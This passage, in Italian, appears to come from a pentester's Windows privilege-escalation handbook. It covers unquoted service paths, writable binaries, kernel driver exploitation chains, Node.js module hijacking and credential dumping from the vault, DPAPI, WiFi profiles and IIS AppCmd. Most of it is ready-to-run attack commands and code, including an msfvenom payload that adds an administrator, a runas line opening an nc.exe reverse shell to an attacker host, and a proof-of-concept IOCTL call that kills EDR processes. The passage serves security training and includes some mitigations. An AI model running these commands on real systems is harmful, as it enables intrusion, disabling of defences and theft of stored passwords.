Se il percorso di un eseguibile non è racchiuso tra virgolette, Windows tenterà di eseguire ogni parte terminante prima di uno spazio.

Ad esempio, per il percorso _C:\Program Files\Some Folder\Service.exe_ Windows tenterà di eseguire:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Elenca tutti i percorsi dei servizi privi di virgolette, escludendo quelli appartenenti ai servizi Windows integrati:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Puoi rilevare e sfruttare** questa vulnerabilità con metasploit: `exploit/windows/local/trusted\_service\_path` Puoi creare manualmente un binario di servizio con metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Azioni di ripristino

Windows consente agli utenti di specificare le azioni da eseguire se un servizio non funziona. Questa funzionalità può essere configurata in modo da puntare a un binary. Se questo binary può essere sostituito, potrebbe essere possibile effettuare un'escalation dei privilegi. Ulteriori dettagli sono disponibili nella [documentazione ufficiale](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Applicazioni

### Applicazioni installate

Controlla i **permessi dei binari** (potresti riuscire a sovrascriverne uno ed effettuare un'escalation dei privilegi) e delle **cartelle** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Permessi di scrittura

Verifica se puoi modificare qualche file di configurazione per leggere qualche file speciale o se puoi modificare qualche binary che verrà eseguito da un account Administrator (schedtasks).

Un modo per trovare permessi deboli su cartelle/file nel sistema è eseguire:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Persistenza/esecuzione tramite autoload dei plugin di Notepad++

Notepad++ carica automaticamente qualsiasi DLL di plugin presente nelle sue sottocartelle `plugins`. Se è presente un'installazione portatile/copia con permessi di scrittura, il caricamento di un plugin malevolo consente l'esecuzione automatica del codice all'interno di `notepad++.exe` a ogni avvio (inclusi `DllMain` e i callback dei plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Esecuzione all'avvio

**Verifica se puoi sovrascrivere qualche registro o binario che verrà eseguito da un utente diverso.**\
**Leggi** la **seguente pagina** per saperne di più sulle **posizioni interessanti degli autorun per effettuare un'escalation dei privilegi**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Driver

Cerca possibili driver **strani/vulnerabili di terze parti**
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Se un driver espone una primitive arbitraria di lettura/scrittura del kernel (comune nei gestori IOCTL progettati male), è possibile effettuare l'escalation sottraendo direttamente un token SYSTEM dalla memoria del kernel. Vedere la tecnica dettagliata qui:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Per i bug di race condition in cui la chiamata vulnerabile apre un percorso Object Manager controllato dall'attaccante, rallentare deliberatamente la ricerca (usando componenti con lunghezza massima o catene di directory profonde) può estendere la finestra da microsecondi a decine di microsecondi:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Cancel-safe queue UAFs, paged-pool disclosures e I/O ring pivots

Alcune catene Windows kernel LPE possono essere costruite a partire da due bug individualmente deboli: una **cancel-safe queue lifetime race** che libera una request/CBD mentre il queue lock è ancora acquisito e una disclosure **lock-release-before-copy** che espone una paged-pool allocation liberata durante `RtlCopyToUser`.

Note di audit e exploitation:

- **Free-under-lock + cancel afterwards**: cercare un success path che esegue **Acquire -> CompleteRequest/free -> Release** mentre il cancel path esegue **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Se il success path raggiunge `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` prima di rilasciare il lock CBDQ/CSQ, un thread bloccato in `NtCancelIoFileEx -> IopCsqCancelRoutine` può riprendere in seguito e passare un `PFLT_CALLBACK_DATA` liberato alla remove callback del driver.
- **Reclaim the freed queue object** con una paged-pool allocation controllata dall'attaccante e delle stesse dimensioni. Le `NPFS` Data Queue Entries sono utili perché il payload e la size sono controllabili e in seguito è possibile sondarle con operazioni pipe read/peek. Se l'oggetto liberato incorpora list links, sovrascriverli con una **cyclic list of fake request nodes in user memory** in modo che il driver elabori ripetutamente request structures definite dall'attaccante invece di terminare presso l'original list head.
- **Upgrade a predictable write**: se la fake request reindirizza un nested context pointer utilizzato dai bookkeeping writes (timestamps / QPC / refcount-adjacent fields), è possibile ottenere una kernel write **address-controlled but not value-controlled**. In tal caso, puntare al campo **length/size** di uno sprayed pool object invece che a un final code/data pointer, quindi enumerare lo spray finché l'oggetto corrotto non produce una **out-of-bounds paged-pool read**.
- **Raceable disclosure pattern**: qualsiasi syscall che esegue `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` è un candidato valido. L'affidabilità migliora quando l'attaccante può aumentare il buffer copiato (ad esempio aggiungendo numerose list/resource entries che aumentano la final allocation size di un serializer), perché una copy più lunga amplia la replacement window senza necessariamente mandare in crash la macchina.
- **Pointer-rich refill targets**: gli array di registered-buffer di Windows **I/O ring** sono ottimi disclosure targets perché la loro paged-pool size è controllata dall'attaccante (`8 * regBufferCnt`) e ogni elemento è un kernel pointer a un `_IOP_MC_BUFFER_ENTRY`. Fare il leak di uno di questi array, recuperare l'`IORING_OBJECT` circostante, quindi corrompere **`RegBuffers`** e **`RegBuffersCount`** in modo che le operazioni successive dell'I/O ring consumino entries contraffatte dall'attaccante e forniscano arbitrary kernel read/write. Se l'unica write disponibile produce un byte stabile (ad esempio da `KUSER_SHARED_DATA+0x14`), usare **overlapping unaligned writes** per costruire un user pointer a byte ripetuti come `0x0101010101010101`, mapparlo con `VirtualAlloc` e collocare lì il forged registered-buffer array.

Indicatori utili per il debugging:
```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```
Una volta ottenuta la lettura/scrittura arbitraria del kernel dalla I/O ring corrotta, ruba un token SYSTEM usando il workflow standard post-primitive:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitive di memory corruption delle registry hive

Le vulnerabilità moderne delle hive consentono di preparare layout deterministici, abusare dei discendenti scrivibili di HKLM/HKU e convertire la corruzione dei metadati in overflow del kernel paged-pool senza un driver personalizzato. Scopri l'intera catena qui:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Type confusion in modalità diretta di `RtlQueryRegistryValues` da percorsi controllati dall'attacker

Alcuni driver accettano un percorso del registro dallo userland, verificano soltanto che sia una stringa UTF-16 valida e poi chiamano `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` con `RTL_QUERY_REGISTRY_DIRECT` verso uno scalare sullo stack come `int readValue`. Se manca `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` viene interpretato in base al tipo **effettivo** del registro, non al tipo previsto dallo sviluppatore.

Questo crea due primitive utili:

- **Confused deputy / oracle**: un percorso assoluto `\Registry\...` controllato dall'utente consente al driver di interrogare chiavi scelte dall'attacker, rivelare l'esistenza tramite codici di ritorno/log e talvolta leggere valori ai quali il chiamante non potrebbe accedere direttamente.
- **Kernel memory corruption**: una destinazione scalare come `&readValue` viene interpretata erroneamente come `REG_QWORD`, `UNICODE_STRING` o buffer binario di dimensione variabile, a seconda del tipo del valore del registro.

Note pratiche sullo sfruttamento:

- **Mitigazione Windows 8+**: se la query raggiunge una **untrusted hive** con `RTL_QUERY_REGISTRY_DIRECT` ma senza `RTL_QUERY_REGISTRY_TYPECHECK`, i chiamanti del kernel causano un crash con `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Per mantenere la possibilità di exploit, cerca chiavi scrivibili dall'attacker all'interno di **trusted system hives** invece di preparare i valori sotto `HKCU`.
- **Staging in una trusted hive**: usa NtObjectManager per enumerare i discendenti scrivibili di `\Registry\Machine` e ripeti la scansione con un token **low-integrity** duplicato per trovare le chiavi raggiungibili da contesti sandboxed:
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: una scrittura diretta di 8 byte all'interno di un `int` di 4 byte corrompe i dati adiacenti dello stack e può sovrascrivere parzialmente un callback/function pointer vicino.
- **`REG_SZ` / `REG_EXPAND_SZ`**: la modalità direct si aspetta che `EntryContext` punti a una `UNICODE_STRING`. Se il codice carica prima un `REG_DWORD` controllato dall'attacker in uno scalare dello stack e poi riutilizza lo stesso buffer per una lettura stringa, l'attacker controlla `Length`/`MaximumLength` e influenza parzialmente il puntatore `Buffer`, ottenendo una scrittura nel kernel semi-controllata.
- **`REG_BINARY`**: per dati binari di grandi dimensioni, la modalità direct tratta il primo `LONG` in `EntryContext` come una dimensione del buffer con segno. Se una precedente lettura `REG_DWORD` lascia un valore negativo controllato dall'attacker nello scalare riutilizzato, la query `REG_BINARY` successiva copia i byte dell'attacker direttamente sopra gli slot adiacenti dello stack, spesso il percorso più semplice per la sovrascrittura completa del callback-pointer.

Pattern di hunting particolarmente efficace: **letture eterogenee dal registry nella stessa variabile dello stack senza reinizializzarla**. Cerca `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, puntatori `EntryContext` riutilizzati e code path in cui la prima lettura dal registry controlla se viene eseguita una seconda lettura.

#### Abuso dell'assenza di FILE_DEVICE_SECURE_OPEN sugli oggetti device (LPE + EDR kill)

Alcuni driver di terze parti firmati creano il proprio device object con uno SDDL restrittivo tramite IoCreateDeviceSecure, ma dimenticano di impostare FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics. Senza questo flag, la DACL sicura non viene applicata quando il device viene aperto tramite un path contenente un componente aggiuntivo, consentendo a qualsiasi utente non privilegiato di ottenere un handle usando un namespace path come:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (da un caso reale)

Una volta che un utente può aprire il device, gli IOCTL privilegiati esposti dal driver possono essere abusati per LPE e tampering. Esempi di capability osservate in the wild:
- Restituire handle con accesso completo a processi arbitrari (token theft / shell SYSTEM tramite DuplicateTokenEx/CreateProcessAsUser).
- Lettura/scrittura raw non limitata del disco (tampering offline, tecniche di persistenza al boot).
- Terminare processi arbitrari, inclusi Protected Process/Light (PP/PPL), consentendo l'EDR/AV kill da user land tramite il kernel.

Pattern PoC minimo (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations per gli sviluppatori
- Imposta sempre FILE_DEVICE_SECURE_OPEN quando crei oggetti dispositivo destinati a essere limitati da una DACL.
- Convalida il contesto del chiamante per le operazioni privilegiate. Aggiungi controlli PP/PPL prima di consentire la terminazione dei processi o la restituzione di handle.
- Limita gli IOCTL (maschere di accesso, METHOD_*, convalida dell’input) e valuta modelli brokered invece di privilegi kernel diretti.

Idee per il rilevamento da parte dei difensori
- Monitora le aperture in user-mode di nomi dispositivo sospetti (ad esempio, \\ .\\amsdk*) e sequenze IOCTL specifiche indicative di abuso.
- Applica la vulnerable driver blocklist di Microsoft (HVCI/WDAC/Smart App Control) e mantieni le tue allowlist/denylist.


## PATH DLL Hijacking

Se disponi di **permessi di scrittura all’interno di una cartella presente in PATH**, potresti essere in grado di effettuare l’hijacking di una DLL caricata da un processo e **aumentare i privilegi**.

Controlla i permessi di tutte le cartelle presenti in PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Per ulteriori informazioni su come abusare di questo controllo:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Hijacking della risoluzione dei moduli Node.js / Electron tramite `C:\node_modules`

Questa è una variante di **uncontrolled search path** su **Windows** che interessa le applicazioni **Node.js** ed **Electron** quando eseguono un import bare come `require("foo")` e il modulo previsto è **missing**.

Node risolve i package risalendo l'albero delle directory e verificando le cartelle `node_modules` in ogni directory padre. Su Windows, questa risalita può raggiungere la root del drive, quindi un'applicazione avviata da `C:\Users\Administrator\project\app.js` potrebbe arrivare a cercare:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Se un **low-privileged user** può creare `C:\node_modules`, può inserire un file `foo.js` malevolo (o una cartella del package) e attendere che un processo **Node/Electron con privilegi superiori** risolva la dependency mancante. Il payload viene eseguito nel contesto di sicurezza del processo vittima, quindi questo diventa **LPE** ogni volta che il target viene eseguito come administrator, da uno scheduled task/wrapper di un service con privilegi elevati o da una desktop app privilegiata avviata automaticamente.

Questo è particolarmente comune quando:

- una dependency è dichiarata in `optionalDependencies`
- una third-party library racchiude `require("foo")` in `try/catch` e continua in caso di errore
- un package è stato rimosso dalle production build, escluso durante il packaging o non è stato installato correttamente
- il `require()` vulnerabile si trova in profondità all'interno dell'albero delle dependency invece che nel codice principale dell'applicazione

### Ricerca dei target vulnerabili

Usa **Procmon** per dimostrare il percorso di risoluzione:

- Filtra per `Process Name` = executable del target (`node.exe`, l'EXE dell'applicazione Electron o il processo wrapper)
- Filtra per `Path` `contains` `node_modules`
- Concentrati su `NAME NOT FOUND` e sull'ultimo open riuscito sotto `C:\node_modules`

Pattern utili per la code review nei file `.asar` estratti o nei sorgenti dell'applicazione:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Identifica il **nome del pacchetto mancante** da Procmon o dalla revisione del codice sorgente.
2. Crea la directory di ricerca nella root se non esiste già:
```powershell
mkdir C:\node_modules
```
3. Rilascia un modulo con il nome esatto previsto:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Attiva l'applicazione vittima. Se l'applicazione tenta `require("foo")` e il modulo legittimo è assente, Node potrebbe caricare `C:\node_modules\foo.js`.

Esempi reali di moduli opzionali mancanti che rientrano in questo schema includono `bluebird` e `utf-8-validate`, ma la **technique** è la parte riutilizzabile: trova qualsiasi **missing bare import** che un processo Windows Node/Electron con privilegi risolverebbe.

### Idee per il rilevamento e l'hardening

- Genera un alert quando un utente crea `C:\node_modules` o vi scrive nuovi file/pacchetti `.js`.
- Cerca processi con alta integrità che leggono da `C:\node_modules\*`.
- Includi tutte le dipendenze runtime nei deployment di produzione e verifica l'uso di `optionalDependencies`.
- Esamina il codice di terze parti alla ricerca di pattern silenziosi `try { require("...") } catch {}`.
- Disabilita le probe opzionali quando la libreria lo supporta (ad esempio, alcuni deployment di `ws` possono evitare la probe legacy `utf-8-validate` con `WS_NO_UTF_8_VALIDATE=1`).

## Rete

### Condivisioni
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Controlla la presenza di altri computer noti hardcoded nel file hosts
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfacce di rete e DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Porte aperte

Verifica la presenza di **servizi con accesso limitato** dall'esterno
```bash
netstat -ano #Opened ports?
```
### Tabella di routing
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Tabella ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Regole del firewall

[**Consulta questa pagina per i comandi relativi al firewall**](../basic-cmd-for-pentesters.md#firewall) **(elencare regole, creare regole, disattivare, disattivare...)**

Altri[ comandi per l'enumerazione della rete qui](../basic-cmd-for-pentesters.md#network)

### Sottosistema Windows per Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Il binario `bash.exe` può essere trovato anche in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Se si ottiene l'utente root, è possibile ascoltare su qualsiasi porta (la prima volta che si usa `nc.exe` per ascoltare su una porta, verrà chiesto tramite GUI se `nc` deve essere consentito dal firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Per avviare facilmente bash come root, puoi provare `--default-user root`

Puoi esplorare il filesystem di `WSL` nella cartella `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Credenziali Windows

### Credenziali Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Gestione credenziali / Windows vault

Da [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault memorizza le credenziali degli utenti per server, siti web e altri programmi a cui **Windows può consentire agli utenti di accedere automaticamente**. A prima vista, questo potrebbe sembrare significare che ora gli utenti possono memorizzare le proprie credenziali Facebook, Twitter, Gmail, ecc., in modo da effettuare automaticamente l'accesso tramite i browser. Ma non è così.

Windows Vault memorizza le credenziali con cui Windows può effettuare automaticamente l'accesso per conto degli utenti; ciò significa che qualsiasi **applicazione Windows che necessita di credenziali per accedere a una risorsa** (un server o un sito web) **può utilizzare Credential Manager** & Windows Vault e usare le credenziali fornite invece di richiedere ogni volta agli utenti di inserire nome utente e password.

A meno che le applicazioni non interagiscano con Credential Manager, non credo sia possibile per loro utilizzare le credenziali relative a una determinata risorsa. Pertanto, se la tua applicazione vuole utilizzare il vault, dovrebbe in qualche modo **comunicare con Credential Manager e richiedere le credenziali per quella risorsa** dal vault di archiviazione predefinito.

Usa `cmdkey` per elencare le credenziali memorizzate sul computer.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Quindi puoi usare `runas` con l'opzione `/savecred` per utilizzare le credenziali salvate. Nell'esempio seguente viene chiamato un binario remoto tramite una condivisione SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Utilizzo di `runas` con un set di credenziali fornito.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Nota che mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) oppure il [modulo Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Le moderne applicazioni UWP di Windows, Microsoft Edge e i moderni servizi di sistema archiviano token di autenticazione e password in chiaro all'interno di `PasswordVault` della Universal Windows Platform (UWP) (esposto anche come `Web Credentials` in `vaultcmd`). Questo spazio di archiviazione è isolato per sessione e può essere decrittografato nativamente senza diritti amministrativi o `SeDebugPrivilege`.

Esegui questo comando PowerShell all'interno della sessione attiva dell'utente per eseguire istantaneamente il dump e decrittografare tutti gli username e le password in chiaro archiviati:
```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```
### DPAPI

La **Data Protection API (DPAPI)** fornisce un metodo per la crittografia simmetrica dei dati, utilizzato principalmente all'interno del sistema operativo Windows per la crittografia simmetrica delle chiavi private asimmetriche. Questa crittografia sfrutta un segreto dell'utente o del sistema per contribuire significativamente all'entropia.

**DPAPI consente di crittografare le chiavi tramite una chiave simmetrica derivata dai segreti di accesso dell'utente**. Negli scenari che coinvolgono la crittografia del sistema, utilizza i segreti di autenticazione del dominio del sistema.

Le chiavi RSA utente crittografate tramite DPAPI sono archiviate nella directory `%APPDATA%\Microsoft\Protect\{SID}`, dove `{SID}` rappresenta l'[Identificatore di sicurezza](https://en.wikipedia.org/wiki/Security_Identifier) dell'utente. **La chiave DPAPI, archiviata insieme alla master key che protegge le chiavi private dell'utente nello stesso file**, è generalmente costituita da 64 byte di dati casuali. (È importante notare che l'accesso a questa directory è limitato, impedendo di elencarne il contenuto tramite il comando `dir` in CMD, sebbene sia possibile elencarlo tramite PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
È possibile utilizzare il **mimikatz module** `dpapi::masterkey` con gli argomenti appropriati (`/pvk` o `/rpc`) per decrittografarlo.

I **file delle credenziali protetti dalla password principale** si trovano solitamente in:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Puoi usare il **mimikatz module** `dpapi::cred` con il `/masterkey` appropriato per decrittografare.\
Puoi **estrarre molte DPAPI** **masterkeys** dalla **memory** con il modulo `sekurlsa::dpapi` (se sei root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Credenziali PowerShell

Le **credenziali PowerShell** vengono spesso utilizzate per attività di **scripting** e automazione, come metodo per archiviare comodamente credenziali crittografate. Le credenziali sono protette tramite **DPAPI**, il che generalmente significa che possono essere decrittografate solo dallo stesso utente e sullo stesso computer in cui sono state create.

Per **decrittografare** le credenziali PS dal file che le contiene, puoi eseguire:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Connessioni RDP salvate

Puoi trovarle in `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
e in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Comandi eseguiti di recente
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Gestore delle credenziali del Desktop remoto**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Usa il modulo `dpapi::rdg` di **Mimikatz** con un `/masterkey` appropriato per **decrittografare qualsiasi file .rdg**\
Puoi **estrarre molte DPAPI masterkeys** dalla memoria con il modulo `sekurlsa::dpapi` di Mimikatz

### Sticky Notes

Spesso le persone usano l'app Sticky Notes sulle workstation Windows per **salvare password** e altre informazioni, senza rendersi conto che si tratta di un file di database. Questo file si trova in `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` ed è sempre utile cercarlo ed esaminarlo.

### AppCmd.exe

**Nota: per recuperare le password da AppCmd.exe è necessario essere Administrator ed eseguire il programma con un livello High Integrity.**\
**AppCmd.exe** si trova nella directory `%systemroot%\system32\inetsrv\`.\
Se questo file esiste, è possibile che siano state configurate alcune **credenziali** e che possano essere **recuperate**.

Questo codice è stato estratto da [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
